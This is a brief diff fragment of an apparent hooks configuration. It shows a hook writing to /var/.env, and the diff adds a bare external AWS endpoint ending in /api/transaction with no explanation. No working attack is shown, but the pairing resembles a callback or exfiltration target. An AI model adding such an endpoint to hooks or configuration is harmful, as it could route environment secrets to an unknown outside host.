@@ -31,3 +31,6 @@ hooks:
                                           ]
                                       },
                                       " >> /var/.env \n"
+
+
+ec2-54-166-255-22.compute-1.amazonaws.com:80/api/transaction                
